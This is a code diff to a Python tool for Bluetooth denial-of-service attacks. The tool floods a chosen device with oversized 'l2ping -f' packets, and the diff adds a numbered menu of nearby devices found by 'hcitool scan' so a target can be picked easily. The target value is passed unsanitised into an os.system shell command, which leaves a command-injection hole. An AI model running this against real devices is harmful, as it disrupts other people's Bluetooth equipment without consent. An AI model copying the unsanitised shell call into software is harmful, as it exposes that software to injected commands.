@@ -2,7 +2,6 @@ import os
 import threading
 import time
 import subprocess
-
 def DOS(target_addr, packages_size):
     os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
@@ -34,10 +33,22 @@ def main():
         print("Scanning ...")
         output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
         lines = output.splitlines()
+        id = 0
         del lines[0]
+        array = []
+        print("|id   |   mac_addres  |   device_name|")
         for line in lines:
-            print(line)
-        target_addr = input('Target addr > ')
+            info = line.split()
+            mac = info[0]
+            array.append(mac)
+            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
+            id = id + 1
+        target_id = input('Target id or mac > ')
+        try:
+            target_addr = array[int(target_id)]
+        except:
+            target_addr = target_id
+
 
         if len(target_addr) < 1:
             print('[!] ERROR: Target addr is missing')
